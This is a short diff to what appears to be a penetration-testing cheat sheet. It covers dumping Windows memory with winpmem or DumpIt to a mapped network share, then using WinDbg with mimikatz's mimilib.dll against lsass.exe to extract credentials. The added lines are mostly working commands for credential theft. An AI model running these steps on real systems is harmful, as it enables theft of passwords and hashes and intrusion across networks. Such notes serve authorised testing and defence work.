@@ -425,14 +425,20 @@ LSASS : MemoryDump + Windbg + Mimikatz
 ---
 ```
 net use Z: \\computer_name\monshare /PERSISTENT:YES
+
 winpmem_mini_x64_rc2.exe Z:mondmp.mem
-ou winpmem_mini_x64_rc2.exe mondump.mem
-MemProcFS_files_and_binaries_v5.11.4-win_x64-20240817>MemProcFS.exe -device ..\mondump.mem -forensic 1 -mount S
+ou winpmem_mini_x64_rc2.exe mondump.mem + copy mondump.mem Z:mondmp.mem
+# MemProcFS.exe -device ..\mondump.mem -forensic 1 -mount S # -> mondump.dmp
+
+ou DumpIt.exe /OUTPUT z:mondump.dmp /QUIET
+
 windgb + memory.dmp
 0:kd>.load C:\Users\XXX\Downloads\mimikatz_trunk\x64\mimilib.dll
 0:kd>!process 0 0 lsass.exe
 0:kd>.process /r /p ffff9a8c884130c0(PROCESS)
 0:kd>!mimikatz
+
+net use z: /delete
 ```
 https://github.com/Velocidex/WinPmem
 
